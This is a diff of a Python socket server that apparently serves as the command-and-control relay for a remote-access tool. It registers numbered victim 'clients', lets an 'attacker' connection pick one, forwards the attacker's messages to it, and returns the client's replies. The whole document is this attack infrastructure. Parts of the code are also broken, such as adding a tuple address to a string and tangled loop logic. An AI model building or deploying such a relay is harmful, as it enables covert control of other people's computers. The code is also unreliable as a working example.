@@ -2,76 +2,82 @@ import socket
 import threading
 
 HEADER = 2048
-PORT = your port here
+PORT = 0  # Replace 0 With Your Port Number
 SERVER = "0.0.0.0"
 ADDR = (SERVER, PORT)
-FORMAT = 'utf-8'
-DISCONNECT_MESSAGE = "!DISCONNECT"
-messageA = ""
-messageC = ""
+FORMAT = "utf-8"
 attacker = []
 client = []
-CLIENTnum = ""
-testtt = False
+clients = []
+selectedclient = ""
+clientnum = ""
+messageA = ""
+messageC = ""
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
 
 
-def handle_client(conn, addr):
-    global client
+def handle_connection(conn, addr):
     global attacker
+    global client
+    global clients
+    global selectedclient
+    global clientnum
     global messageA
     global messageC
-    global CLIENTnum
-    global testtt
-    print(f"[NEW CONNECTION] {addr} connected.")
-    connected = True
-    while connected:
+    i = 0
+    loop = False
+    while True:
         msg = conn.recv(HEADER).decode(FORMAT)
-        if str(msg).split(":")[0] == "CLIENT":
-            while True:
-                if str(msg).split(":")[1] == CLIENTnum:
-                    try:
-                        client = conn, addr
-                        client[0].send("connected".encode(FORMAT))
-                        messageC = msg
-                        print(f"from {client[1]}: " + msg)
-                        msg = ""
-                        while True:
-                            msg = conn.recv(HEADER).decode(FORMAT)
-                            messageC = msg
-                            if messageC:
+        if msg:
+            loop = True
+        while loop:
+            if "<?CLIENT?>" in msg:
+                clientnum, messageC = str(msg).split("<?CLIENT?>")
+                if i == 0:
+                    clients.append((clientnum, addr, conn))
+                    print(addr + " client connected")
+                i = 1
+                if selectedclient:
+                    for c in clients:
+                        if c[1] == addr:
+                            print(c[1])
+                            print(addr)
+                            if c[0] == selectedclient:
+                                print("client: " + messageC)
                                 attacker[0].send(messageC.encode(FORMAT))
-                                print(f"sent to attacker:  {messageC}")
                                 messageC = ""
-                    except:
-                        pass
-        if "ATTACKER" in msg:
-            try:
-                attacker = conn, addr
-                messageA = msg
-                CLIENTnum = msg.split(":")[1]
-                print(f"from {attacker[1]}: " + msg)
-                while True:
-                    msg = conn.recv(HEADER).decode(FORMAT)
-                    messageA = msg
-                    if messageA:
-                        client[0].send(messageA.encode(FORMAT))
-                        print(f"sent to client:  {messageA}")
-                        messageA = ""
-            except:
-                pass
-    conn.close()
+                                loop = False
+                            else:
+                                loop = False
+                        else:
+                            loop = False
+                else:
+                    loop = False
+            else:
+                loop = False
+
+        if "<?ATTACKER?>" in msg:
+            attacker = conn, addr
+            while True:
+                selectedclient, messageA = str(msg).split("<?ATTACKER?>")
+                if clients:
+                    print("attacker: " + messageA)
+                    for c in clients:
+                        if c[0] == selectedclient:
+                            c[2].send(messageA.encode(FORMAT))
+                    messageA = ""
+                    break
 
 
 def start():
     server.listen(100)
-    print(f"[LISTENING] Server is listening on {SERVER}")
+    print(f"[LISTENING] Server is listening on {SERVER}:{PORT}")
     while True:
         conn, addr = server.accept()
-        thread = threading.Thread(target=handle_client, args=(conn, addr))
-        thread.start()
+        thread1 = threading.Thread(target=handle_connection, args=(conn, addr))
+        thread1.start()
 
 
 print("[STARTING] server is starting...")
